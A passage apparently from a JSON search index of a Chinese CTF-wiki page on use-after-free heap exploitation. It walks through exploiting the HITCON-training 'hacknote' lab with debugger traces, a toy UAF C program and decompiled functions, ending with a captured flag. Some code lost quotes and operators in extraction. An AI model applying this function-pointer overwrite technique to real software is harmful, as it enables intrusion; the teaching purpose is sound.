\nbins\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[\n \nFastbins\n \nfor\n \narena\n \n0xf7fac780\n \n]\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\nFastbins\n[\nidx\n=\n0\n,\n \nsize\n=\n0x8\n]\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b008\n,\n \nsize\n=\n0x10\n)\n \n\nFastbins\n[\nidx\n=\n1\n,\n \nsize\n=\n0xc\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n2\n,\n \nsize\n=\n0x10\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n3\n,\n \nsize\n=\n0x14\n]\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b018\n,\n \nsize\n=\n0x28\n)\n \n\nFastbins\n[\nidx\n=\n4\n,\n \nsize\n=\n0x18\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n5\n,\n \nsize\n=\n0x1c\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n6\n,\n \nsize\n=\n0x20\n]\n \n0x00\n\n\n\n\n\n\u5f53\u6211\u4eec\u5c06note1\u4e5f\u5168\u90e8\u5220\u9664\u5b8c\u6bd5\u540e\uff0c\u518d\u6b21\u89c2\u770bbins\u3002\u53ef\u4ee5\u770b\u51fa\uff0c\u540e\u5220\u9664\u7684chunk\u5757\u786e\u5b9e\u5904\u4e8e\u8868\u5934\u3002\n\n\ngef\n\u27a4\n  \nheap\n \nbins\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nFastbins\n \nfor\n \narena\n \n0xf7fac780\n \n]\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\nFastbins\n[\nidx\n=\n0\n,\n \nsize\n=\n0x8\n]\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b040\n,\n \nsize\n=\n0x10\n)\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b008\n,\n \nsize\n=\n0x10\n)\n \n\nFastbins\n[\nidx\n=\n1\n,\n \nsize\n=\n0xc\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n2\n,\n \nsize\n=\n0x10\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n3\n,\n \nsize\n=\n0x14\n]\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b050\n,\n \nsize\n=\n0x28\n)\n  \n\u2190\n  \nUsedChunk\n(\naddr\n=\n0x804b018\n,\n \nsize\n=\n0x28\n)\n \n\nFastbins\n[\nidx\n=\n4\n,\n \nsize\n=\n0x18\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n5\n,\n \nsize\n=\n0x1c\n]\n \n0x00\n\n\nFastbins\n[\nidx\n=\n6\n,\n \nsize\n=\n0x20\n]\n \n0x00\n\n\n\n\n\n\u90a3\u4e48\uff0c\u6b64\u65f6\u5373\u5c06\u8981\u7533\u8bf7note2\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u4e0bnote2\u90fd\u7533\u8bf7\u5230\u4e86\u4ec0\u4e48\u5185\u5b58\u5757\uff0c\u5982\u4e0b\n\n\n\u7533\u8bf7note2\u5bf9\u5e94\u7684\u5185\u5b58\u5757\u4e3a0x804b040\uff0c\u5176\u5b9e\u5c31\u662fnote1\u5bf9\u5e94\u7684\u5185\u5b58\u5730\u5740\u3002\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b040\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b040\n\n\n0\nx080486cf\n \nin\n \nadd_note\n \n()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nregisters\n \n]\n\u2500\u2500\u2500\u2500\n\n\n$eax\n   \n:\n \n0x0804b040\n  \n\u2192\n  \n0x0804b000\n  \n\u2192\n  \n0x00000000\n\n\n$ebx\n   \n:\n \n0x00000000\n\n\n$ecx\n   \n:\n \n0xf7fac780\n  \n\u2192\n  \n0x00000000\n\n\n$edx\n   \n:\n \n0x0804b040\n  \n\u2192\n  \n0x0804b000\n  \n\u2192\n  \n0x00000000\n\n\n$esp\n   \n:\n \n0xffffcf10\n  \n\u2192\n  \n0x00000008\n\n\n$ebp\n   \n:\n \n0xffffcf48\n  \n\u2192\n  \n0xffffcf68\n  \n\u2192\n  \n0x00000000\n\n\n$esi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$edi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$eip\n   \n:\n \n0x080486cf\n  \n\u2192\n  \nadd_note\n+\n89\n \nadd\n \nesp\n,\n \n0x10\n\n\n$cs\n    \n:\n \n0x00000023\n\n\n$ss\n    \n:\n \n0x0000002b\n\n\n$ds\n    \n:\n \n0x0000002b\n\n\n$es\n    \n:\n \n0x0000002b\n\n\n$fs\n    \n:\n \n0x00000000\n\n\n$gs\n    \n:\n \n0x00000063\n\n\n$eflags:\n \n[\ncarry\n \nPARITY\n \nadjust\n \nZERO\n \nsign\n \ntrap\n \nINTERRUPT\n \ndirection\n \noverflow\n \nresume\n \nvirtualx86\n \nidentification\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:\ni386\n \n]\n\u2500\u2500\u2500\u2500\n\n    \n0\nx80486c2\n \nadd_note\n+\n76\n    \nadd\n    \nDWORD\n \nPTR\n \n[\neax\n],\n \neax\n\n    \n0\nx80486c4\n \nadd_note\n+\n78\n    \nadd\n    \nBYTE\n \nPTR\n \n[\nebx\n+\n0x86a0cec\n],\n \nal\n\n    \n0\nx80486ca\n \nadd_note\n+\n84\n    \ncall\n   \n0x80484e0\n \nmalloc@plt\n\n \n\u2192\n  \n0\nx80486cf\n \nadd_note\n+\n89\n    \nadd\n    \nesp\n,\n \n0x10\n\n\n\n\n\n\u7533\u8bf7note2\u7684content\u7684\u5185\u5b58\u5730\u5740\u4e3a0x804b008\uff0c\u5c31\u662fnote0\u5bf9\u5e94\u7684\u5730\u5740\uff0c\u5373\u6b64\u65f6\u6211\u4eec\u5411note2\u7684content\u5199\u5185\u5bb9\uff0c\u5c31\u4f1a\u5c06note0\u7684put\u5b57\u6bb5\u8986\u76d6\u3002\n\n\ngef\n\u27a4\n  \nn\n \n1\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b008\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b008\n\n\n0\nx08048761\n \nin\n \nadd_note\n \n()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nregisters\n \n]\n\u2500\u2500\u2500\u2500\n\n\n$eax\n   \n:\n \n0x0804b008\n  \n\u2192\n  \n0x00000000\n\n\n$ebx\n   \n:\n \n0x0804b040\n  \n\u2192\n  \n0x0804865b\n  \n\u2192\n  \nprint_note_content\n+\n0\n \npush\n \nebp\n\n\n$ecx\n   \n:\n \n0xf7fac780\n  \n\u2192\n  \n0x00000000\n\n\n$edx\n   \n:\n \n0x0804b008\n  \n\u2192\n  \n0x00000000\n\n\n$esp\n   \n:\n \n0xffffcf10\n  \n\u2192\n  \n0x00000008\n\n\n$ebp\n   \n:\n \n0xffffcf48\n  \n\u2192\n  \n0xffffcf68\n  \n\u2192\n  \n0x00000000\n\n\n$esi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$edi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$eip\n   \n:\n \n0x08048761\n  \n\u2192\n  \nadd_note\n+\n235\n \nadd\n \nesp\n,\n \n0x10\n\n\n$cs\n    \n:\n \n0x00000023\n\n\n$ss\n    \n:\n \n0x0000002b\n\n\n$ds\n    \n:\n \n0x0000002b\n\n\n$es\n    \n:\n \n0x0000002b\n\n\n$fs\n    \n:\n \n0x00000000\n\n\n$gs\n    \n:\n \n0x00000063\n\n\n$eflags:\n \n[\ncarry\n \nPARITY\n \nadjust\n \nZERO\n \nsign\n \ntrap\n \nINTERRUPT\n \ndirection\n \noverflow\n \nresume\n \nvirtualx86\n \nidentification\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:\ni386\n \n]\n\u2500\u2500\u2500\u2500\n\n    \n0\nx8048752\n \nadd_note\n+\n220\n   \nmov\n    \nal\n,\n \nds\n:\n0x458b0804\n\n    \n0\nx8048757\n \nadd_note\n+\n225\n   \ncall\n   \n0x581173df\n\n    \n0\nx804875c\n \nadd_note\n+\n230\n   \ncall\n   \n0x80484e0\n \nmalloc@plt\n\n \n\u2192\n  \n0\nx8048761\n \nadd_note\n+\n235\n   \nadd\n    \nesp\n,\n \n0x10\n\n\n\n\n\n\u6211\u4eec\u6765\u5177\u4f53\u68c0\u9a8c\u4e00\u4e0b\uff0c\u770b\u4e00\u4e0b\u8986\u76d6\u524d\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u770b\u5230\u8be5\u5185\u5b58\u5757\u7684put\u6307\u9488\u5df2\u7ecf\u88ab\u7f6e\u4e3aNULL\u4e86\uff0c\u8fd9\u662f\u7531fastbin\u7684free\u673a\u5236\u51b3\u5b9a\u7684\u3002\n\n\ngef\n\u27a4\n  \nx\n/\n2\nxw\n \n0x804b008\n\n\n0\nx804b008:\n  \n0\nx00000000\n  \n0x0804b018\n\n\n\n\n\n\u8986\u76d6\u540e\uff0c\u5177\u4f53\u7684\u503c\u5982\u4e0b\n\n\ngef\n\u27a4\n  \nx\n/\n2\nxw\n \n0x804b008\n\n\n0\nx804b008:\n  \n0\nx08048986\n  \n0x0804b00a\n\n\ngef\n\u27a4\n  \nx\n/\ni\n \n0x08048986\n\n   \n0\nx8048986\n \nmagic\n:\n   \npush\n   \nebp\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u786e\u5b9e\u5df2\u7ecf\u88ab\u8986\u76d6\u4e3a\u6211\u4eec\u6240\u60f3\u8981\u7684magic\u51fd\u6570\u4e86\u3002\n\n\n\u6700\u540e\u6267\u884c\u7684\u6548\u679c\u5982\u4e0b\n\n\n[\n+\n]\n Starting \nlocal\n process \n./hacknote\n: pid \n35030\n\n\n[\n*\n]\n Switching to interactive mode\nflag\n{\nuse_after_free\n}\n----------------------\n       HackNote       \n----------------------\n \n1\n. Add note          \n \n2\n. Delete note       \n \n3\n. Print note        \n \n4\n. Exit              \n----------------------\n\n\n\n\n\u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9gef\u7684heap-analysis-helper \u6765\u770b\u4e00\u4e0b\u6574\u4f53\u7684\u5806\u7684\u7533\u8bf7\u4e0e\u91ca\u653e\u7684\u60c5\u51b5\uff0c\u5982\u4e0b\n\n\ngef\n\u27a4\n  \nheap-analysis-helper\n \n\n[*]\n \nThis\n \nfeature\n \nis\n \nunder\n \ndevelopment\n,\n \nexpect\n \nbugs\n \nand\n \nunstability...\n\n\n[+]\n \nTracking\n \nmalloc\n()\n\n\n[+]\n \nTracking\n \nfree\n()\n\n\n[+]\n \nTracking\n \nrealloc\n()\n\n\n[+]\n \nDisabling\n \nhardware\n \nwatchpoints\n \n(\nthis\n \nmay\n \nincrease\n \nthe\n \nlatency\n)\n\n\n[+]\n \nDynamic\n \nbreakpoints\n \ncorrectly\n \nsetup\n,\n \nGEF\n \nwill\n \nbreak\n \nexecution\n \nif\n \na\n \npossible\n \nvulnerabity\n \nis\n \nfound.\n\n\n[*]\n \nNote:\n \nThe\n \nheap\n \nanalysis\n \nslows\n \ndown\n \nnoticeably\n \nthe\n \nexecution.\n \n\ngef\n\u27a4\n  \nc\n\n\nContinuing.\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b008\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b008\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n32\n)\n=\n0x804b018\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b040\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n32\n)\n=\n0x804b050\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nfree\n(\n0x804b018\n)\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nwatching\n \n0x804b018\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nfree\n(\n0x804b008\n)\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nwatching\n \n0x804b008\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nfree\n(\n0x804b050\n)\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nwatching\n \n0x804b050\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nfree\n(\n0x804b040\n)\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nwatching\n \n0x804b040\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b040\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nmalloc\n(\n8\n)\n=\n0x804b008\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nCleaning\n \nup\n\n\n[+]\n \nHeap-Analysis\n \n-\n \nRe-enabling\n \nhardware\n \nwatchpoints\n\n\n[\nNew\n \nprocess\n \n36248\n]\n\n\nprocess\n \n36248\n \nis\n \nexecuting\n \nnew\n \nprogram\n:\n \n/\nbin\n/\ndash\n\n\n[\nNew\n \nprocess\n \n36249\n]\n\n\nprocess\n \n36249\n \nis\n \nexecuting\n \nnew\n \nprogram\n:\n \n/\nbin\n/\ncat\n\n\n[\nInferior\n \n3\n \n(\nprocess\n \n36249\n)\n \nexited\n \nnormally\n]\n\n\n\n\n\n\u8fd9\u91cc\u7b2c\u4e00\u4e2a\u8f93\u51fa\u4e86\u4e24\u6b21\uff0c\u5e94\u8be5\u662fgef\u5de5\u5177\u7684\u95ee\u9898\u3002\n\n\n\u9898\u76ee\n\n\n\n\n2016 HCTF fheap", 
            "title": "Use After Free"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#use-after-free", 
            "text": "", 
            "title": "Use After Free"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_1", 
            "text": "\u7b80\u5355\u7684\u8bf4\uff0cUse After Free \u5c31\u662f\u5176\u5b57\u9762\u6240\u8868\u8fbe\u7684\u610f\u601d\uff0c\u5f53\u4e00\u4e2a\u5185\u5b58\u5757\u88ab\u91ca\u653e\u4e4b\u540e\u518d\u6b21\u88ab\u4f7f\u7528\u3002\u4f46\u662f\u5176\u5b9e\u8fd9\u91cc\u6709\u4ee5\u4e0b\u51e0\u79cd\u60c5\u51b5   \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c \u7136\u540e\u518d\u6b21\u4f7f\u7528\uff0c\u81ea\u7136\u7a0b\u5e8f\u4f1a\u5d29\u6e83\u3002  \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3a NULL \uff0c\u7136\u540e\u5728\u5b83\u4e0b\u4e00\u6b21\u88ab\u4f7f\u7528\u4e4b\u524d\uff0c\u6ca1\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u5757\u8fdb\u884c\u4fee\u6539\uff0c\u90a3\u4e48 \u7a0b\u5e8f\u5f88\u6709\u53ef\u80fd\u53ef\u4ee5\u6b63\u5e38\u8fd0\u8f6c \u3002  \u5185\u5b58\u5757\u88ab\u91ca\u653e\u540e\uff0c\u5176\u5bf9\u5e94\u7684\u6307\u9488\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\uff0c\u4f46\u662f\u5728\u5b83\u4e0b\u4e00\u6b21\u4f7f\u7528\u4e4b\u524d\uff0c\u6709\u4ee3\u7801\u5bf9\u8fd9\u5757\u5185\u5b58\u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u518d\u6b21\u4f7f\u7528\u8fd9\u5757\u5185\u5b58\u65f6\uff0c \u5c31\u5f88\u6709\u53ef\u80fd\u4f1a\u51fa\u73b0\u5947\u602a\u7684\u95ee\u9898 \u3002   \u800c\u6211\u4eec\u4e00\u822c\u6240\u6307\u7684  Use After Free  \u6f0f\u6d1e\u4e3b\u8981\u662f\u540e\u4e24\u79cd\u3002\u6b64\u5916\uff0c \u6211\u4eec\u4e00\u822c\u79f0\u88ab\u91ca\u653e\u540e\u6ca1\u6709\u88ab\u8bbe\u7f6e\u4e3aNULL\u7684\u5185\u5b58\u6307\u9488\u4e3adangling pointer\u3002  \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50  #include   stdio.h  #include   stdlib.h  typedef   struct   name   { \n   char   * myname ; \n   void   ( * func )( char   * str );  }   NAME ;  void   myprint ( char   * str )   {   printf ( %s \\n ,   str );   }  void   printmyname ()   {   printf ( call print my name \\n );   }  int   main ()   { \n   NAME   * a ; \n   a   =   ( NAME   * ) malloc ( sizeof ( struct   name )); \n   a - func   =   myprint ; \n   a - myname   =   I can also use it ; \n   a - func ( this is my function ); \n   // free without modify \n   free ( a ); \n   a - func ( I can also use it ); \n   // free with modify \n   a - func   =   printmyname ; \n   a - func ( this is my function ); \n   // set NULL \n   a   =   NULL ; \n   printf ( this pogram will crash... \\n ); \n   a - func ( can not be printed... );  }   \u8fd0\u884c\u7ed3\u679c\u5982\u4e0b  \u279c  use_after_free git: ( use_after_free )  \u2717 ./use_after_free                      \nthis is my  function \nI can also use it\ncall print my name\nthis pogram will crash... [ 1 ]      38738  segmentation fault  ( core dumped )   ./use_after_free", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_2", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5 HITCON-training \u4e2d\u7684 lab 10 hacknote\u4e3a\u4f8b\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_3", 
            "text": "\u6211\u4eec\u53ef\u4ee5\u7b80\u5355\u5206\u6790\u4e0b\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u770b\u51fa\u5728\u7a0b\u5e8f\u7684\u5f00\u5934\u6709\u4e2amenu\u51fd\u6570\uff0c\u5176\u4e2d\u6709     puts (  1. Add note           ); \n   puts (  2. Delete note        ); \n   puts (  3. Print note         ); \n   puts (  4. Exit               );   \u6545\u800c\u7a0b\u5e8f\u5e94\u8be5\u4e3b\u8981\u67093\u4e2a\u529f\u80fd\u3002\u4e4b\u540e\u7a0b\u5e8f\u4f1a\u6839\u636e\u7528\u6237\u7684\u8f93\u5165\u6267\u884c\u76f8\u5e94\u7684\u529f\u80fd\u3002", 
            "title": "\u529f\u80fd\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#add_note", 
            "text": "\u6839\u636e\u7a0b\u5e8f\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u6700\u591a\u53ef\u4ee5\u6dfb\u52a05\u4e2anote\u3002\u6bcf\u4e2anote\u6709\u4e24\u4e2a\u5b57\u6bb5put\u4e0econtent\uff0c\u5176\u4e2dput\u4f1a\u88ab\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u51fd\u6570\uff0c\u5176\u51fd\u6570\u4f1a\u8f93\u51fa content \u5177\u4f53\u7684\u5185\u5bb9\u3002  unsigned   int   add_note ()  { \n   note   * v0 ;   // ebx \n   signed   int   i ;   // [esp+Ch] [ebp-1Ch] \n   int   size ;   // [esp+10h] [ebp-18h] \n   char   buf ;   // [esp+14h] [ebp-14h] \n   unsigned   int   v5 ;   // [esp+1Ch] [ebp-Ch] \n\n   v5   =   __readgsdword ( 0x14u ); \n   if   (   count   =   5   ) \n   { \n     for   (   i   =   0 ;   i   =   4 ;   ++ i   ) \n     { \n       if   (   ! notelist [ i ]   ) \n       { \n         notelist [ i ]   =   malloc ( 8u ); \n         if   (   ! notelist [ i ]   ) \n         { \n           puts ( Alloca Error ); \n           exit ( - 1 ); \n         } \n         notelist [ i ] - put   =   print_note_content ; \n         printf ( Note size : ); \n         read ( 0 ,   buf ,   8u ); \n         size   =   atoi ( buf ); \n         v0   =   notelist [ i ]; \n         v0 - content   =   malloc ( size ); \n         if   (   ! notelist [ i ] - content   ) \n         { \n           puts ( Alloca Error ); \n           exit ( - 1 ); \n         } \n         printf ( Content : ); \n         read ( 0 ,   notelist [ i ] - content ,   size ); \n         puts ( Success ! ); \n         ++ count ; \n         return   __readgsdword ( 0x14u )   ^   v5 ; \n       } \n     } \n   } \n   else \n   { \n     puts ( Full ); \n   } \n   return   __readgsdword ( 0x14u )   ^   v5 ;  }", 
            "title": "add_note"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#print_note", 
            "text": "print_note\u5c31\u662f\u7b80\u5355\u7684\u6839\u636e\u7ed9\u5b9a\u7684note\u7684\u7d22\u5f15\u6765\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15\u7684note\u7684\u5185\u5bb9\u3002  unsigned   int   print_note ()  { \n   int   v1 ;   // [esp+4h] [ebp-14h] \n   char   buf ;   // [esp+8h] [ebp-10h] \n   unsigned   int   v3 ;   // [esp+Ch] [ebp-Ch] \n\n   v3   =   __readgsdword ( 0x14u ); \n   printf ( Index : ); \n   read ( 0 ,   buf ,   4u ); \n   v1   =   atoi ( buf ); \n   if   (   v1     0   ||   v1   =   count   ) \n   { \n     puts ( Out of bound! ); \n     _exit ( 0 ); \n   } \n   if   (   notelist [ v1 ]   ) \n     notelist [ v1 ] - put ( notelist [ v1 ]); \n   return   __readgsdword ( 0x14u )   ^   v3 ;  }", 
            "title": "print_note"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#delete_note", 
            "text": "delete_note \u4f1a\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\u6765\u91ca\u653e\u5bf9\u5e94\u7684note\u3002\u4f46\u662f\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u5728 \u5220\u9664\u7684\u65f6\u5019\uff0c\u53ea\u662f\u5355\u7eaf\u8fdb\u884c\u4e86free\uff0c\u800c\u6ca1\u6709\u8bbe\u7f6e\u4e3aNULL\uff0c\u90a3\u4e48\u663e\u7136\uff0c\u8fd9\u91cc\u662f\u5b58\u5728Use After Free\u7684\u60c5\u51b5\u7684\u3002  unsigned   int   del_note ()  { \n   int   v1 ;   // [esp+4h] [ebp-14h] \n   char   buf ;   // [esp+8h] [ebp-10h] \n   unsigned   int   v3 ;   // [esp+Ch] [ebp-Ch] \n\n   v3   =   __readgsdword ( 0x14u ); \n   printf ( Index : ); \n   read ( 0 ,   buf ,   4u ); \n   v1   =   atoi ( buf ); \n   if   (   v1     0   ||   v1   =   count   ) \n   { \n     puts ( Out of bound! ); \n     _exit ( 0 ); \n   } \n   if   (   notelist [ v1 ]   ) \n   { \n     free ( notelist [ v1 ] - content ); \n     free ( notelist [ v1 ]); \n     puts ( Success ); \n   } \n   return   __readgsdword ( 0x14u )   ^   v3 ;  }", 
            "title": "delete_note"
        }, 
        {
            "location": "/pwn/heap/use_after_free/#_4", 
